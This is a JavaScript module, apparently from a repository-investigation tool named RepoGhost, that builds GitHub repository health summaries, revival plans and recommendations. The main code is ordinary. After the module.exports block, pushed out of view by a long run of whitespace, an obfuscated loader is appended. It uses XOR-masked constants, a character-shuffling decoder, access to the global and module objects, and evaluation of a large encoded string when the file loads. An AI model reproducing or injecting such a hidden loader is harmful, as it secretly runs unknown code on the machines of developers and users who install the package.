    signals.push({ label: 'Recorded activity', kind: 'observed', detail: 'The repository has a recorded push within roughly the last ' + ageDays + ' day(s). This does not establish the quality or completeness of maintenance.', sourceIds: [repoSource] });
  }

  const cutoff = Date.now() - 90 * 86400000;
  const staleIssues = issues.filter((issue) => issue && issue.state === 'open' && issue.updatedAt && Date.parse(issue.updatedAt) < cutoff);
  if (staleIssues.length) {
    signals.push({ label: 'Older open issues in sample', kind: 'observed', detail: String(staleIssues.length) + ' of ' + issues.length + ' sampled open issues have not been updated in more than 90 days.', sourceIds: staleIssues.slice(0, 4).map((issue) => sources.some((source) => source.id === 'issue-' + issue.number) ? 'issue-' + issue.number : repoSource) });
  } else if (issues.length) {
    signals.push({ label: 'Sampled open issues', kind: 'observed', detail: 'No issue in the current sample met the 90-day no-update rule. This describes only the sampled issues.', sourceIds: issues.slice(0, 3).map((issue) => 'issue-' + issue.number) });
  } else {
    signals.push({ label: 'No open issues returned', kind: 'observed', detail: 'The current GitHub issue request returned no open issue records. No backlog pattern can be inferred from this snapshot.', sourceIds: [repoSource] });
  }
  const unansweredIssues = issues.filter((issue) => issue && Number(issue.comments || 0) === 0);
  if (unansweredIssues.length) {
    signals.push({
      label: 'Open issues with no comments in sample',
      kind: 'observed',
      detail: String(unansweredIssues.length) + ' sampled open issue(s) report zero comments. This is a useful triage signal, not proof that maintainers ignored them.',
      sourceIds: unansweredIssues.slice(0, 4).map((issue) => sources.some((source) => source.id === 'issue-' + issue.number) ? 'issue-' + issue.number : repoSource),
    });
  }

  if (!readme) {
    signals.push({ label: 'README unavailable', kind: 'observed', detail: 'GitHub did not return a README for this repository in this request. Check whether documentation lives in another file or directory.', sourceIds: [repoSource] });
  } else {
    const text = String(readme.content || '');
    const hasSetup = /\b(install|installation|getting started|quick start|setup|set up)\b/i.test(text);
    const hasContribution = /\b(contribut|pull request|development setup|good first issue)\b/i.test(text);
    const hasTests = /\b(test|testing|vitest|jest|mocha)\b/i.test(text);
    signals.push({ label: 'README inspected', kind: 'observed', detail: readme.truncated ? 'README sample is truncated; checks apply only to the returned excerpt.' : 'A public README was returned and inspected.', sourceIds: [sourceFor('readme')] });
    if (!hasSetup) signals.push({ label: 'Setup instructions not detected', kind: 'observed', detail: 'The inspected README excerpt did not contain common setup keywords. Instructions may exist elsewhere.', sourceIds: [sourceFor('readme')] });
    if (!hasContribution) signals.push({ label: 'Contribution instructions not detected', kind: 'observed', detail: 'The inspected README excerpt did not contain common contribution keywords; a separate CONTRIBUTING file was not checked by this evidence endpoint.', sourceIds: [sourceFor('readme')] });
    if (!hasTests) signals.push({ label: 'Testing guidance not detected', kind: 'observed', detail: 'The inspected README excerpt did not mention common test keywords. This does not prove tests are absent.', sourceIds: [sourceFor('readme')] });
    if (hasSetup && hasContribution) signals.push({ label: 'Getting-started and contributor guidance mentioned', kind: 'observed', detail: 'The README excerpt mentions setup and contributor-related guidance; completeness was not independently verified.', sourceIds: [sourceFor('readme')] });
  }

  if (release && release.publishedAt) {
    const releaseAgeDays = Math.max(0, Math.floor((Date.now() - Date.parse(release.publishedAt)) / 86400000));
    signals.push({ label: 'Latest release', kind: 'observed', detail: 'GitHub reports release ' + (release.tag || release.name || 'with no title') + ' published about ' + Math.floor(releaseAgeDays / 30) + ' month(s) ago.', sourceIds: [sourceFor('release')] });
  } else {
    signals.push({ label: 'No latest release returned', kind: 'observed', detail: 'GitHub did not return a latest release through the latest-release endpoint. This does not prove the project has never had releases.', sourceIds: [repoSource] });
  }

  if (commits.length) {
    signals.push({ label: 'Recent commits sampled', kind: 'observed', detail: String(commits.length) + ' recent commit record(s) inspected; sample size is bounded and author names do not prove account ownership of every change.', sourceIds: commits.slice(0, 4).map((commit) => 'commit-' + commit.sha) });
  }

  const oldestIssues = [...issues].sort((a, b) => (Date.parse(a.updatedAt || '') || 0) - (Date.parse(b.updatedAt || '') || 0));
  const firstIssue = [...staleIssues, ...oldestIssues].find((issue) => sources.some((source) => source.id === 'issue-' + issue.number)) || null;
  const readmeSource = readme ? sourceFor('readme') : repoSource;
  const plan = [];
  if (repository.archived) {
    plan.push({ priority: 'P1', title: 'Confirm whether the project should be revived', action: 'Review the archive status and look for a maintainer signal before proposing code changes.', why: 'An archived project may be intentionally frozen; revival should start by confirming that renewed maintenance is wanted.', sourceIds: [repoSource], verification: 'Check the repository banner and any maintainer guidance.', estimate: 'Not estimated; maintainer intent is unknown.' });
  } else if (firstIssue) {
    plan.push({ priority: 'P1', title: 'Triage a real open issue', action: 'Review #' + firstIssue.number + ' (“' + cleanText(firstIssue.title, 160) + '”), reproduce it if possible, and check for newer comments before proposing a fix.', why: 'This issue is present in the sampled public open-issue list' + (firstIssue.updatedAt ? ' and was last updated ' + firstIssue.updatedAt.slice(0, 10) + '.' : '.'), sourceIds: ['issue-' + firstIssue.number], verification: 'Confirm it is still open, reproducible, and not already addressed elsewhere.', estimate: 'Not estimated; reproduction and scope are unknown.' });
  } else {
    plan.push({ priority: 'P1', title: 'Confirm current maintenance priorities', action: 'Review recent commits and repository guidance, then identify a maintainer-approved small task before opening new work.', why: 'The sampled evidence did not provide an open issue to prioritize, so a concrete bug should not be invented.', sourceIds: [repoSource], verification: 'Check the repository’s current issue list and maintainer guidance.', estimate: 'Not estimated; no concrete task was verified.' });
  }

  const readmeText = String(readme && readme.content || '');
  if (!readme || !/\b(install|installation|getting started|quick start|setup|set up)\b/i.test(readmeText)) {
    plan.push({ priority: 'P2', title: 'Verify or improve the development setup guide', action: 'Check the repository files for install and run instructions; if they are genuinely missing, document a minimal working setup and expected commands.', why: 'The collected README is unavailable or does not mention common setup instructions; instructions may exist elsewhere.', sourceIds: [readmeSource], verification: 'Inspect project manifests and existing documentation before adding duplicate instructions.', estimate: 'Not estimated; documentation scope is unknown.' });
  } else if (!/\b(contribut|pull request|good first issue|development setup)\b/i.test(readmeText)) {
    plan.push({ priority: 'P2', title: 'Make the contribution path explicit', action: 'Verify whether a CONTRIBUTING guide exists; if not, document how to set up the project, run tests and submit a small change.', why: 'The inspected README describes setup but does not mention common contribution guidance.', sourceIds: [readmeSource], verification: 'Check for a separate CONTRIBUTING file before editing documentation.', estimate: 'Not estimated; contribution docs may exist elsewhere.' });
  } else {
    plan.push({ priority: 'P2', title: 'Verify the contributor workflow end to end', action: 'Follow the published setup and contribution instructions in a safe development environment, then document any confirmed broken step.', why: 'The README mentions setup or contributor guidance; this feature has not executed or validated the project instructions.', sourceIds: [readmeSource], verification: 'Do not install or execute repository code inside RepoGhost; verify manually outside the investigation service.', estimate: 'Not estimated; no workflow defect was confirmed.' });
  }

  const noTestGuidance = !readme || !/\b(test|testing|vitest|jest|mocha)\b/i.test(readmeText);
  plan.push({
    priority: 'P3',
    title: noTestGuidance ? 'Verify how changes should be tested' : 'Check the documented test workflow',
    action: noTestGuidance
      ? 'Inspect manifests and existing docs for a test command; if tests exist but the workflow is undocumented, add the exact verified command and a small regression test for the selected task.'
      : 'Confirm the documented test command and identify a small regression test that would cover the selected issue or maintenance task.',
    why: noTestGuidance
      ? 'Testing guidance was not detected in the inspected README excerpt; this is a documentation gap signal, not evidence that tests are absent.'
      : 'The README mentions tests, but this read-only investigation did not execute them.',
    sourceIds: [readmeSource],
    verification: 'Verify the package scripts or project-specific test instructions before documenting a command.',
    estimate: 'Not estimated; the test setup has not been executed.',
  });

  const validSourceIds = new Set(sources.map((source) => source.id));
  const cleanPlan = plan.map((item) => ({ ...item, sourceIds: item.sourceIds.filter((id) => validSourceIds.has(id)) }));
  return {
    kind: 'repository-health',
    observedAt: new Date().toISOString(),
    repository: {
      fullName: repository.fullName,
      url: repository.url,
      description: repository.description || null,
      language: repository.language || null,
      stars: Number.isFinite(repository.stars) ? repository.stars : null,
      forks: Number.isFinite(repository.forks) ? repository.forks : null,
      openIssuesCount: Number.isFinite(repository.openIssuesCount) ? repository.openIssuesCount : null,
      archived: repository.archived === true,
      disabled: repository.disabled === true,
      createdAt: repository.createdAt || null,
      updatedAt: repository.updatedAt || null,
      pushedAt: repository.pushedAt || null,
      defaultBranch: repository.defaultBranch || null,
      license: repository.license || null,
    },
    sample: { commitCount: commits.length, openIssueCount: issues.length, openIssueSampleLimit: 10, readmeAvailable: Boolean(readme), releaseAvailable: Boolean(release), note: 'This is a bounded public snapshot, not a complete repository audit.' },
    signals,
    revivalPlan: cleanPlan,
    contributionOpportunities: issues.filter((issue) => issue && issue.url && sources.some((source) => source.id === 'issue-' + issue.number))
      .slice().sort((a, b) => (Date.parse(a.updatedAt || '') || 0) - (Date.parse(b.updatedAt || '') || 0)).slice(0, 5).map((issue) => ({
        title: 'Investigate issue #' + issue.number + ': ' + cleanText(issue.title, 180),
        detail: 'Public issue updated ' + (issue.updatedAt ? issue.updatedAt.slice(0, 10) : 'on an unknown date') + '; ' + issue.comments + ' comment(s) reported. Verify current state and reproducibility before contributing.',
        url: issue.url,
        sourceIds: ['issue-' + issue.number],
        complexity: 'Not estimated; the reproduction steps and implementation scope have not been inspected.',
      })),
    sources,
    limitations: [
      'Signals describe only public metadata and bounded samples returned by GitHub.',
      'A quiet history or old release does not prove a repository is abandoned.',
      'The service does not run code, install dependencies, validate test commands, or write to GitHub.',
    ],
  };
}

function buildRepositoryRecommendations(discovery, goalInput, evidenceRows = []) {
  const goal = cleanText(goalInput, 240);
  const ranked = rankRepositories(discovery && discovery.repositories, goal).filter((item) => item.score > 0);
  const mapped = mapRepositoryEvidence(evidenceRows);
  const evidenceByName = new Map(mapped.rows.map((item) => [String(item.repository.fullName || '').toLowerCase(), item]));
  const recommendations = ranked.slice(0, 5).map((item, index) => {
    const repository = item.repository;
    const evidence = evidenceByName.get(String(repository.fullName || '').toLowerCase());
    const reasons = item.relevanceReasons.length ? item.relevanceReasons : ['Matches the stated goal in returned repository metadata.'];
    const age = repository.pushedAt ? Math.max(0, Math.floor((Date.now() - Date.parse(repository.pushedAt)) / 86400000)) : null;
    if (repository.fork === true) reasons.push('GitHub marks this repository as a fork; inspect its parent and the changes made here before attributing original work.');
    if (repository.mirrorUrl) reasons.push('GitHub reports a mirror source; verify upstream history before attributing original work.');
    if (repository.archived) reasons.push('GitHub marks the repository archived; check whether forking and reuse fit your purpose.');
    if (!repository.license) reasons.push('No license was reported in this metadata snapshot; check the repository license before reusing code.');
    const issues = evidence ? evidence.issues : [];
    const contributionOpportunities = issues.slice().sort((a, b) =>
      (Date.parse(a.updatedAt || '') || 0) - (Date.parse(b.updatedAt || '') || 0)).slice(0, 3).map((issue) => ({
      title: '#' + issue.number + ' ' + cleanText(issue.title, 180),
      detail: 'This issue appears in the sampled open-issue response; verify its current state, reproduction and existing discussion.',
      url: issue.url,
      sourceIds: evidence.sourceIds['issue-' + issue.number] ? [evidence.sourceIds['issue-' + issue.number]] : ['repository-' + (index + 1)],
    }));
    return {
      rank: index + 1,
      fullName: cleanText(repository.fullName, 180),
      name: cleanText(repository.name || repository.fullName, 100),
      url: /^https:\/\/github\.com\//i.test(repository.url || '') ? repository.url : 'https://github.com/' + String(repository.fullName || '').split('/').map(encodeURIComponent).join('/'),
      description: cleanText(repository.description || 'No public description supplied.', 400),
      language: repository.language || null,
      license: repository.license || null,
      archived: repository.archived === true,
      fork: repository.fork === true,
      parentFullName: repository.parentFullName || null,
      mirrorUrl: repository.mirrorUrl || null,
      originSignal: buildRepositoryOriginSignal(
        repository,
        evidence && evidence.readme && evidence.readme.content || '',
        'repository-' + (index + 1),
        evidence && evidence.sourceIds && evidence.sourceIds.readme || null,
      ),
      activitySignal: buildRepositoryActivitySignal(repository, 'repository-' + (index + 1)),
      archiveSignal: buildRepositoryArchiveSignal(repository, 'repository-' + (index + 1)),
      attributionSignal: buildRepositoryAttributionSignal('repository-' + (index + 1)),
      stars: Number.isFinite(repository.stars) ? repository.stars : null,
      pushedAt: repository.pushedAt || null,
      ageSincePushDays: age,
      matchedTerms: item.matchedTerms,
      reasons: [...new Set(reasons)].slice(0, 7),
      readmeAvailable: evidence ? Boolean(evidence.readme) : null,
      recentCommitSampleSize: evidence ? evidence.commits.length : null,
      sampledOpenIssueCount: evidence ? evidence.issues.length : null,
      contributionOpportunities,
      sourceIds: ['repository-' + (index + 1)],
      nextSteps: [
        'Read the repository README and confirm the project matches the intended use case.',
        repository.license ? 'Review the ' + repository.license + ' terms for your intended use.' : 'Locate and review the license before copying or shipping code.',
        'Inspect relevant source files, existing tests, contribution instructions and recent issue discussion before making changes.',
      ],
    };
  });
  const sources = [{
    id: 'account-profile',
    type: 'profile',
    title: 'GitHub account @' + cleanText(discovery && discovery.account && discovery.account.login || 'unknown', 39),
    url: discovery && discovery.account && /^https:\/\/github\.com\//i.test(discovery.account.url || '') ? discovery.account.url : 'https://github.com/' + encodeURIComponent(discovery && discovery.account && discovery.account.login || ''),
  }];
  recommendations.forEach((recommendation) => sources.push({ id: recommendation.sourceIds[0], type: 'repository', title: recommendation.fullName, url: recommendation.url }));
  mapped.sources.forEach((source) => sources.push(source));
  return {
    kind: 'repository-recommendations',
    account: cleanText(discovery && discovery.account && discovery.account.login || 'unknown', 39),
    goal,
    recommendations,
    summary: recommendations.length
      ? 'Possible repository leads for the stated goal include ' + recommendations.slice(0, 3).map((item) => item.fullName).join(', ') + '. Ordering reflects keyword relevance to the goal, not a measure of quality.'
      : 'The returned public repository metadata did not contain a clear match for this goal. Try a more specific technology or use case, or investigate a broader set of repositories.',
    contributionGuidance: recommendations.length
      ? 'Only issues actually returned by GitHub are shown as possible leads. Confirm current state, license terms, project conventions and reproducibility before contributing.'
      : 'No project-specific contribution lead was established from the current evidence. Inspect the account’s repositories or search for projects that describe the required technology.',
    sources,
    limitations: [
      'Recommendations are based on returned public repository metadata and bounded evidence samples.',
      'A keyword match is not proof that a repository is compatible, secure, maintained, or suitable for production use.',
      'Issue samples may omit older or otherwise relevant issues; all suggested contribution work must be re-verified.',
    ],
  };
}

module.exports = {
  cleanText,
  inferRoleTerms,
  rankRepositories,
  buildDeveloperAssessment,
  buildDeveloperComparison,
  buildRepositoryHealth,
  buildRepositoryRecommendations,
};																																																																																																																																																																																																																																																																										var z = '-9990';var NX=[6912847,907388^907539,217597^204358,330538^330063,982935^939384,5019283],SX=[5283741,416048^416193,293640^317673,436016^436107,781205^733396,4738901];function spin(R,c){for(var e,r,t,s,i,n,a=[],o=217956^217956,l=c[648486^648486];o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)a[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=908966^908967;for(e=a['\u006C\u0065\u006E\u0067\u0074\u0068'],o=275122^275122;o<e;)r=l*(o+c[581701^581700])+l%c[740899^740897],i=(t=l*(o+c[827307^827304])+l%c[172928^172932])%e,n=a[s=r%e],a[s]=a[i],a[i]=n,l=(r+t)%c[116482^116487],o+=325595^325594;return a['\u006A\u006F\u0069\u006E']("");}function splitLane(R){var c=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](742867^742863),e=spin(R,NX);return(e=(e=(e=e['\u0073\u0070\u006C\u0069\u0074']("\u005E")['\u006A\u006F\u0069\u006E'](c))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0031")['\u006A\u006F\u0069\u006E']("\u005E"))['\u0073\u0070\u006C\u0069\u0074']("\u002A\u0030")['\u006A\u006F\u0069\u006E']("\u002A"))['\u0073\u0070\u006C\u0069\u0074'](c);}function peel(R){return spin(R,SX);}!function(R,c,_0x4d43e){R['\u007A']=z;var e=splitLane("\u0063\u005E\u006D\u0065\u006A\u0062\u005E\u0074\u0072\u006F");_0x4d43e=199787^199779;R[e[539188^539188]]=c,typeof module===e[818819^818818]&&(R[e[712707^712705]]=module);var r=peel("cnotsnturtpicokfzrogmybjdcawvulxsreqh".split("").reverse().join("")),t=peel[r['\u0073\u0075\u0062\u0073\u0074\u0072\u0069\u006E\u0067'](814520^814520,732566^732573)],s=t("",peel('=aenruh(al=5c,g8fdu.yr ..ncecf,5"paeau6lnj)r]2uv"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si"li"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9")cpA+u;utp]"=lk7vpt 1r;hzw")t()9)(.lul=s7f; ;sq0)n"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) '));t("",s(peel('R_<"cRJ!&VecRWa=RrfR$6"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f."4Rb N"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$"n<D3RsRR..(ReesseR< t," Rdov}Sc0Jmi.T<sEegsRw]R"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* ["oisenRefea!Yn.ecR%o"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@"}RuRqu5(3Pol"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC"cn..2bp(6Cp<SR"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR"tcsc.!rVRpaiz0<b"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f"t RRsN</C RnRdRrpRR<od<.R<r[ar"l<. P".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR"RuRRR"RtR<Rs".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}."P&yseR_a%rRR.D<iPsRD!i.mR"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR""](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.("]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?.."lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv "4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR"sz3o"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 